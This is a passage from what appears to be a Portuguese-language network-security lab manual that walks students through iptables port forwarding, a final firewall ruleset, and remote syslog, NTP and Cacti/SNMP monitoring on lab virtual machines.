<p>Em seguida, vamos monitorar o log de acesso do Apache, aguardando por conexões:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># tail -f -n0 /var/log/apache2/access.log</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, temos que descobrir o IP público da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s enp0s3 | grep '^ *inet '
    inet 192.168.29.103/24 brd 192.168.29.255 scope global enp0s3</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, vamos acessar esse IP na porta 80 a partir da máquina física:</p>
</div>
<div id="img-firewall-dnat-linserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/firewall-dnat-linserver.png" alt="firewall dnat linserver">
</div>
<div class="title">Figure 44. Teste DNAT do acesso Internet &gt; LinServer</div>
</div>
<div class="paragraph">
<p>Voltando ao monitoramento do log de acessos do Apache na máquina <em>LinServer-G</em>, vemos que o acesso de fato se concretizou:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# tail -f -n0 /var/log/apache2/access.log
192.168.29.102 - - [25/Aug/2018:15:19:57 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
192.168.29.102 - - [25/Aug/2018:15:19:57 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://192.168.29.103/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</pre>
</div>
</div>
</li>
<li>
<p>Faça o mesmo processo para a configuração do DNAT da máquina <em>WinServer-G</em>. Atente-se para o fato de que duas portas internat, 80/TCP e 123/UDP, serão acessadas através das portas externas 8080/TCP e 8123/UDP respectivamente. Configure o PAT de acordo.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A PREROUTING -i enp0s3 -p tcp -m multiport --dports 21,443 -j DNAT --to-destination 172.16.1.20
# iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 8080 -j DNAT --to-destination 172.16.1.20:80
# iptables -t nat -A PREROUTING -i enp0s3 -p udp --dport 8123 -j DNAT --to-destination 172.16.1.20:123</pre>
</div>
</div>
</li>
<li>
<p>Teste sua configuração. Em sua máquina física, acesso o IP público da máquina <em>FWGW1-G</em> na porta 8080/TCP e verifique que de fato é exibida no navegador a página web do servidor IIS instalada na máquina <em>WinServer-G</em>.</p>
<div class="paragraph">
<p>Utilizando o mesmo IP público descoberto anteriormente, basta acessá-lo na porta 8080 como solicitado:</p>
</div>
<div id="img-firewall-dnat-winserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/firewall-dnat-winserver.png" alt="firewall dnat winserver">
</div>
<div class="title">Figure 45. Teste DNAT do acesso Internet &gt; WinServer</div>
</div>
</li>
</ol>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_6_revisão_final_da_configuração_do_firewall_fwgw1_g">6) Revisão final da configuração do firewall <strong><em>FWGW1-G</em></strong></h3>
<div class="paragraph">
<p>Salve a configuração feita até aqui e reinicie o firewall com os comandos:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# iptables-save &gt; /etc/iptables/rules.v4
# systemctl restart netfilter-persistent.service</pre>
</div>
</div>
<div class="paragraph">
<p>Revise se todos os pontos abordados até aqui foram contemplados. Que outras regras interessantes poderiam ser incluídas na configuração desse firewall?</p>
</div>
<div class="paragraph">
<p>Abaixo, temos a configuração final sugerida para o firewall:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash"># Generated by iptables-save v1.6.0 on Thu Oct 11 10:17:13 2018
*filter
:INPUT DROP [57:15290]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [75:8092]
-A INPUT -i lo -j ACCEPT
-A INPUT -d 127.0.0.0/8 -i !lo -j REJECT --reject-with icmp-port-unreachable
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -s 10.1.1.0/24 -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-A INPUT -s 172.16.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
-A INPUT -s 10.1.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p tcp -m multiport --dports 22,25,80,110,5432 -j ACCEPT
-A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT
-A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443,3389 -j ACCEPT
-A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT
-A FORWARD -s 172.16.1.0/24 -o enp0s3 -j ACCEPT
-A FORWARD -s 10.1.1.0/24 -o enp0s3 -j ACCEPT
-A FORWARD -d 172.16.1.10/32 -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j ACCEPT
-A FORWARD -d 172.16.1.10/32 -i enp0s3 -p udp -m multiport --dports 53,123 -j ACCEPT
-A FORWARD -d 172.16.1.20/32 -i enp0s3 -p tcp -m multiport --dports 21,443,80 -j ACCEPT
-A FORWARD -d 172.16.1.20/32 -i enp0s3 -p udp -m multiport --dports 123 -j ACCEPT
COMMIT
# Completed on Thu Oct 11 10:17:13 2018
# Generated by iptables-save v1.6.0 on Thu Oct 11 10:17:13 2018
*nat
:PREROUTING ACCEPT [2:84]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A PREROUTING -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j DNAT --to-destination 172.16.1.10
-A PREROUTING -i enp0s3 -p udp -m multiport --dports 53,123 -j DNAT --to-destination 172.16.1.10
-A PREROUTING -i enp0s3 -p tcp -m multiport --dports 21,443 -j DNAT --to-destination 172.16.1.20
-A PREROUTING -i enp0s3 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.16.1.20:80
-A PREROUTING -i enp0s3 -p udp -m udp --dport 8123 -j DNAT --to-destination 172.16.1.20:123
-A POSTROUTING -s 10.1.1.0/24 -o enp0s3 -j MASQUERADE
-A POSTROUTING -s 172.16.1.0/24 -o enp0s3 -j MASQUERADE
COMMIT
# Completed on Thu Oct 11 10:17:13 2018</code></pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_4_serviços_básicos_de_segurança">Sessão 4: Serviços básicos de segurança</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_configuração_do_servidor_de_log_remoto">1) Configuração do servidor de log remoto</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade iremos configurar um repositório de logs em um servidor da DMZ (<em>LinServer-G</em>), e enviar os logs dos demais servidores para esse concentrador. O objetivo desta atividade é fazer o aluno aplicar os conceitos de repositório de logs de uma rede e preparar o ambiente para os serviços seguintes, que serão configurados durante o curso.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, vamos configurar o concentrador de logs. Acesse a máquina <em>LinServer-G</em> e instale o pacote <code>syslog-ng</code>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# apt-get install --no-install-recommends syslog-ng</pre>
</div>
</div>
</li>
<li>
<p>Observe que na última linha do arquivo <code>/etc/syslog-ng/syslog-ng.conf</code> são incluídos arquivos com a extensão <code>.conf</code> localizados no diretório <code>/etc/syslog-ng/conf.d</code>:</p>
<div class="literalblock">
<div class="content">
<pre># tail -n1 /etc/syslog-ng/syslog-ng.conf
@include "/etc/syslog-ng/conf.d/*.conf"</pre>
</div>
</div>
<div class="paragraph">
<p>Aproveitando-se desse fato, crie um novo arquivo com a extensão apropriada nesse diretório e configure o recebimento de logs remotos. Faça com que o <code>syslog-ng</code> escute por conexões na porta 514/UDP, e envie os arquivos de log de uma dado <em>host</em> para o arquivo <code>/var/log/$HOST.log</code>. Finalmente, reinicie o <code>syslog-ng</code>.</p>
</div>
<div class="paragraph">
<p>Crie o arquivo novo <code>/etc/syslog-ng/conf.d/rserver.conf</code>, que cumpre os objetivos especificados, com o seguinte conteúdo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">source s_net { udp(); };
destination d_rhost { file("/var/log/$HOST.log"); };
log { source(s_net); destination(d_rhost); };</code></pre>
</div>
</div>
<div class="paragraph">
<p>Depois, basta reiniciar o serviço:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart syslog-ng.service</pre>
</div>
</div>
</li>
<li>
<p>Agora, na máquina <em>FWGW1-G</em>, instale o <code>syslog-ng</code> e configure-o como um cliente Syslog. Crie um arquivo de configuração na pasta <code>/etc/syslog-ng/conf.d</code> que envie todos os eventos de log locais para a máquina <em>LinServer-G</em> na porta 514/UDP.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# apt-get install --no-install-recommends syslog-ng</pre>
</div>
</div>
<div class="paragraph">
<p>Crie o arquivo novo <code>/etc/syslog-ng/conf.d/rclient.conf</code>, que envia os logs locais para o servidor remoto, com o seguinte conteúdo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">destination d_rserver { udp("172.16.1.10" port(514)); };
log { source(s_src); destination(d_rserver); };</code></pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, basta reiniciar o <code>syslog-ng</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart syslog-ng.service</pre>
</div>
</div>
</li>
<li>
<p>Usando o comando <code>logger</code>, teste seu ambiente.</p>
<div class="paragraph">
<p>Na máquina <em>FWGW1-G</em>, crie um evento de log qualquer usando o comando <code>logger</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# logger -p error Teste</pre>
</div>
</div>
<div class="paragraph">
<p>Observando a máquina <em>LinServer-G</em>, perceba que foi criado um novo arquivo <code>/var/log/172.16.G.1.log</code>. Verificando seu conteúdo, é possível constatar que, de fato, os logs remotos do <em>host</em> <em>FWGW1-G</em> estão sendo enviados para cá.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# tail -n1 /var/log/172.16.1.1.log
Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos configurar a máquina <em>WinServer-G</em> para enviar registros de eventos para o concentrador Syslog. Faça login como usuário <code>Administrator</code> e abra o <em>Group Policy Editor</em> digitando <code>gpedit.msc</code> no menu <em>Start</em> &gt; <em>Run&#8230;&#8203;</em>.</p>
<div class="paragraph">
<p>Na ferramenta, acesse a seção <em>Computer Configuration</em> &gt; <em>Windows Settings</em> &gt; <em>Security Settings</em> &gt; <em>Local Policies</em> &gt; <em>Audit Policy</em> e habilite os seguintes eventos como "Sucesso" e "Falha":</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 11. Políticas de auditoria para o WinServer-G</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Policy</th>
<th class="tableblock halign-left valign-top">Security Setting</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit account logon events</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Success, Failure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit account management</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Success, Failure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit directory service access</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">No auditing</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit logon events</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Success, Failure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit object access</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Failure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit policy change</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Success</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit privilege use</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Failure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit process tracking</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">No Auditing</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Audit system events</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Success, Failure</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>A tela ficaria, portanto, desta forma:</p>
</div>
<div id="img-syslog-gpedit" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/syslog-gpedit.png" alt="syslog gpedit">
</div>
<div class="title">Figure 46. Tela de políticas de auditoria para o WinServer-G</div>
</div>
</li>
<li>
<p>O próximo passo é instalar o Snare, que permitirá envio dos registros de eventos do Windows para um servidor Syslog remoto. Faça o download em <a href="https://www.snaresolutions.com/products/snare-agents/open-source-agents/" class="bare">https://www.snaresolutions.com/products/snare-agents/open-source-agents/</a> ; será necessário cadastrar seu nome/email para receber o link de download. Alternativamente, solicite o instalador ao instrutor.</p>
<div class="paragraph">
<p>Durante a instalação, responda todas as perguntas com as opções padrão, exceto:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 12. Opções de instalação do Snare</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Opção</th>
<th class="tableblock halign-left valign-top">Escolha</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Snare Auditing</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Yes</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Service Account</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Use System Account</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Remote Control Interface</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enable Web Access (Password: rnpesr)</p></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Após a instalação, abra o Snare. Clique em <em>Start</em> e digite "snare", escolhendo a opção <code>Snare for Windows (Open Source)</code>, como se segue:</p>
<div id="img-syslog-snare-start" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/syslog-snare-start.png" alt="syslog snare start">
</div>
<div class="title">Figure 47. Inicialização do Snare</div>
</div>
<div class="paragraph">
<p>Irá ser lançada uma janela do navegador. Informe o usuário <code>snare</code>, e senha <code>rnpesr</code>, como se segue:</p>
</div>
<div id="img-syslog-snare-password" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/syslog-snare-password.png" alt="syslog snare password">
</div>
<div class="title">Figure 48. Login no Snare</div>
</div>
<div class="paragraph">
<p>Clique em <em>Network Configuration</em>&#8201;&#8212;&#8201;informe o IP da máquina <em>LinServer-G</em> no campo <em>Destination Snare Server address</em>, e a porta 514 no campo <em>Destination Port</em>, como se segue. Em seguida, clique em <em>Change Configuration</em>.</p>
</div>
<div id="img-syslog-snare-config" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/syslog-snare-config.png" alt="syslog snare config">
</div>
<div class="title">Figure 49. Configurações do Snare</div>
</div>
<div class="paragraph">
<p>Em seguida, clique em <em>Apply the Latest Audit Configuration</em> e depois em <em>Reload Settings</em>.</p>
</div>
</li>
<li>
<p>Faça logoff/logon no <em>WinServer-G</em> para gerar registros de eventos. Em seguida, volte à máquina <em>LinServer-G</em> e verifique que os logs estão de fato sendo enviados.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# grep Logoff /var/log/172.16.1.20.log
Aug 26 07:10:25 172.16.1.20 WinServer-A MSWinEventLog   1       Security        50      dom ago 26 08:10:23 2018  4647    Microsoft-Windows-Security-Auditing     WINSERVER-A\Administrator       N/A     Success Audit     WinServer-A     Logoff          User initiated logoff:    Subject:   Security ID:  S-1-5-21-1959434341-4039883546-812769935-500   Account Name:  Administrator   Account Domain:  WINSERVER-A   Logon ID:  0x16898    This event is generated when a logoff is initiated but the token reference count is not zero and the logon session cannot be destroyed.  No further user-initiated activity can occur.  This event can be interpreted as a logoff event.  41</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_configuração_do_servidor_de_hora">2) Configuração do servidor de hora</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade vamos configurar o serviço de sincronismo de relógio em um servidor da rede (<em>LinServer-G</em>) e configurar os demais <em>hosts</em> da rede para sincronizar com o relógio desse servidor.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, vamos configurar o servidor de hora. Acesse a máquina <em>LinServer-G</em> e instale o pacote <code>ntp</code>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install --no-install-recommends ntp</pre>
</div>
</div>
</li>
<li>
<p>Edite o arquivo <code>/etc/ntp.conf</code> e substitua o conteúdo das linhas 20-23 (que começam com a palavra-chave <code>pool</code>) pelas que se seguem. Comente ou remova as linhas originais.</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/ntp.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^server' /etc/ntp.conf
server a.ntp.br iburst
server b.ntp.br iburst
server c.ntp.br iburst</pre>
</div>
</div>
</li>
<li>
<p>Para sincronizar o relógio de forma imediata, pare o serviço do <code>ntp</code>, rode o comando <code>ntpd -gq</code> e em seguida inicie o <em>daemon</em>. Verifique se a hora está corrigida.</p>
<div class="literalblock">
<div class="content">
<pre># systemctl stop ntp</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ntpd -gq
ntpd: time slew +0.000090s</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># date
qui out 11 15:25:50 -03 2018</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl start ntp</pre>
</div>
</div>
</li>
<li>
<p>Cheque se o <code>ntp</code> está funcionando, e se está escutando por conexões de rede na porta esperada. A seguir, iremos configurar os clientes NTP.</p>
<div class="literalblock">
<div class="content">
<pre># ntpq -c pe
     remote           refid      st t when poll reach   delay   offset  jitter
==============================================================================
*a.ntp.br        200.160.7.186    2 u   48   64   77   16.623   -0.352   0.229
 b.ntp.br        200.160.7.186    2 u   51   64   77   57.992   -1.086   0.239
 c.ntp.br        200.160.7.186    2 u   50   64   77   40.497   -2.432   0.281</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># netstat -unlp | grep '^udp .*:123'
udp        0      0 172.16.1.10:123         0.0.0.0:*                           11052/ntpd
udp        0      0 127.0.0.1:123           0.0.0.0:*                           11052/ntpd
udp        0      0 0.0.0.0:123             0.0.0.0:*                           11052/ntpd</pre>
</div>
</div>
</li>
<li>
<p>Vamos configurar o cliente NTP Linux, na máquina <em>FWGW1-G</em>. Instale o pacote <code>ntp</code>; edite o arquivo <code>/etc/ntp.conf</code> para consultar o servidor de hora <em>LinServer-G</em>; pare o serviço <code>ntp</code>, sincronize a hora imediatamente e reinicie-o.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install --no-install-recommends ntp</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/ntp.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^server' /etc/ntp.conf
server 172.16.1.10 iburst</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl stop ntp</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ntpd -gq
ntpd: time slew -0.000270s</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># date
qui out 11 15:28:12 -03 2018</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl start ntp</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, configure o cliente NTP na máquina <em>WinServer-G</em>. O Microsoft Windows possui uma forma simples de configurar o sincronismo de relógio com servidores de rede, desde de que não tenham o servidor de diretório <em>Microsoft Active Directory</em> como controlador de domínio, pois dessa forma o sincronismo é automático.</p>
<div class="paragraph">
<p>Para a configuração do sincronismo automático do <em>host</em> Windows com o servidor de hora da rede, clique no relógio da barra de tarefas, e em seguida em <em>Change date and time settings&#8230;&#8203;</em>; logo depois, navegue até a aba <em>Internet Time</em>.</p>
</div>
<div id="img-ntp-win-internettime" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ntp-win-internettime.png" alt="ntp win internettime">
</div>
<div class="title">Figure 50. Aba Internet Time do relógio do Windows</div>
</div>
<div class="paragraph">
<p>Clique em <em>Change Settings&#8230;&#8203;</em>, e informe o IP da máquina <em>LinServer-G</em> no campo <em>Server</em>. Em seguida, clique em <em>Update now</em> (se ocorrer um erro, clique uma segunda vez), e o relógio do sistema deverá ser atualizado.</p>
</div>
<div id="img-ntp-win-setserver" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ntp-win-setserver.png" alt="ntp win setserver">
</div>
<div class="title">Figure 51. Modificando o servidor NTP do Windows</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_monitoramento_de_serviços">3) Monitoramento de serviços</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade prática, o software Cacti será configurado para monitorar os recursos dos servidores da rede. O Cacti e os pacotes necessários para o correto funcionamento serão instalados na máquina <em>LinServer-G</em>. Serão configurados agentes SNMP nos servidores <em>WinServer-G</em> e <em>FWGW1-G</em> para que o Cacti possa monitorar os recursos desses hosts.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, vamos instalar o Cacti. Acesse a máquina <em>LinServer-G</em> e instale o pacote <code>cacti</code>.</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Quando perguntado sobre o <em>web server</em> para o qual o Cacti deve ser autoconfigurado, escolha <code>apache2</code>.</p>
</li>
<li>
<p>Quando perguntado se a base de dados do Cacti deve ser configurada usando o <code>dbconfig-common</code>, responda <em>Yes</em>. Para a senha do usuário administrativo da base de dados e a senha do aplicativo Cacti no MySQL, informe <code>rnpesr123</code> para ambas as perguntas.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install cacti
(...)</pre>
</div>
</div>
</li>
<li>
<p>Em sua máquina física, acesse a URL <code><a href="http://172.16.1.10/cacti" class="bare">http://172.16.1.10/cacti</a></code> para acessar a console administrativa do Cacti. Entre com o usuário <code>admin</code> e senha <code>rnpesr123</code>.</p>
<div id="img-cacti-console" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-console.png" alt="cacti console">
</div>
<div class="title">Figure 52. Console do Cacti</div>
</div>
</li>
<li>
<p>Vamos instalar o agente SNMP na máquina <em>FWGW1-G</em>. Instale o pacote <code>snmpd</code>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install --no-install-recommends snmpd</pre>
</div>
</div>
</li>
<li>
<p>Edite o arquivo <code>/etc/snmp/snmpd.conf</code>, comente a linha <code>agentAddress  udp:127.0.0.1:161</code> e descomente a linha <code>agentAddress udp:161,udp6:[::1]:161</code>. Em seguida, reinicie o <code>snmpd</code> e verifique que ele está escutando na porta apropriada.</p>
<div class="literalblock">
<div class="content">
<pre># vi /etc/snmp/snmpd.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^#*agentAddress' /etc/snmp/snmpd.conf
#agentAddress  udp:127.0.0.1:161
agentAddress udp:161,udp6:[::1]:161</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart snmpd</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># netstat -unlp | grep '^udp .*:161'
udp        0      0 0.0.0.0:161             0.0.0.0:*                           12527/snmpd</pre>
</div>
</div>
</li>
<li>
<p>Lembre-se que a <em>chain</em> INPUT da tabela <em>filter</em> do firewall <em>FWGW1-G</em> não está configurada para permitir conexões nessa porta. Corrija o problema e salve as modificações no arquivo <code>/etc/iptables/rules.v4</code>.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -s 172.16.1.10/32 -p udp -m udp --dport 161 -m state --state NEW,ESTABLISHED -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables-save &gt; /etc/iptables/rules.v4</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos instalar o agente SNMP na máquina <em>WinServer-G</em>. Acesse como usuário <em>Administrator</em> e, dentro do <em>Server Manager</em>, clique com o botão direito em <em>Features</em> &gt; <em>Add Features</em>. Desça a barra de rolagem, selecione a caixa <em>SNMP Services</em> e prossiga com o assistente.</p>
<div id="img-snmp-wininstall" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snmp-wininstall.png" alt="snmp wininstall">
</div>
<div class="title">Figure 53. Instalação da feature SNMP</div>
</div>
</li>
<li>
<p>Abra o gestor de serviços do Windows, via menu <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> &gt; <code>services.msc</code>. Encontre o serviço <em>SNMP Service</em> e clique com o botão direto &gt; <em>Properties</em>.</p>
<div id="img-snmp-winprop" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snmp-winprop.png" alt="snmp winprop">
</div>
<div class="title">Figure 54. Propriedades do serviço SNMP</div>
</div>
<div class="paragraph">
<p>Na aba <em>Security</em>, caixa <em>Accepted community names</em>, clique em <em>Add&#8230;&#8203;</em> e adicione a comunidade <code>public</code> com permissões <em>READ ONLY</em>. Logo abaixo, na caixa <em>Accept SNMP packets from these hosts</em>, clique em <em>Add&#8230;&#8203;</em> e adicione o IP da máquina <em>LinServer-G</em>. Sua janela deverá ficar assim:</p>
</div>
<div id="img-snmp-winconfig" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snmp-winconfig.png" alt="snmp winconfig">
</div>
<div class="title">Figure 55. Configurações do serviço SNMP</div>
</div>
<div class="paragraph">
<p>Finalmente, clique com o botão direito no serviço <em>SNMP Service</em> e em seguida em <em>Restart</em>.</p>
</div>
</li>
<li>
<p>De volta à console do Cacti, no navegador da sua máquina física acessando a URL <code><a href="http://172.16.1.10/cacti" class="bare">http://172.16.1.10/cacti</a></code>, vamos adicionar os dois servidores configurados. No menu à esquerda, clique em <em>Devices</em>, e em seguida na palavra <em>Add</em> no canto superior direto da nova janela.</p>
<div id="img-cacti-adddevice" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-adddevice.png" alt="cacti adddevice">
</div>
<div class="title">Figure 56. Adicionando device no Cacti, parte 1</div>
</div>
<div class="paragraph">
<p>Na nova janela, informe o nome da máquina <em>FWGW1-G</em> no campo <em>Description</em>, seu IP exposto à DMZ no campo <em>Hostname</em>, e escolha a opção <em>Local Linux Machine</em> no campo <em>Host Template</em>. Verifique se sua janela está como se segue, e clique em <em>Create</em>.</p>
</div>
<div id="img-cacti-adddevice2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-adddevice2.png" alt="cacti adddevice2">
</div>
<div class="title">Figure 57. Adicionando device no Cacti, parte 2</div>
</div>
<div class="paragraph">
<p>Verifique que as informações SNMP do <em>host</em> <em>FWGW1-G</em> figuram corretamente na seção <em>SNMP Information</em> no topo da tela. Em seguida, clique em <em>Create Graphs for this Host</em>.</p>
</div>
<div id="img-cacti-cgraphs" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-cgraphs.png" alt="cacti cgraphs">
</div>
<div class="title">Figure 58. Adicionando gráficos no Cacti, parte 1</div>
</div>
<div class="paragraph">
<p>Na nova janela, selecione todos os <em>Graph Templates</em> e <em>Data Queries</em> disponíveis e clique em <em>Create</em>. Na janela que se segue, clique novamente em <em>Create</em>.</p>
</div>
<div id="img-cacti-cgraphs2" class="imageblock" style="text-align: center">
<div class="content">
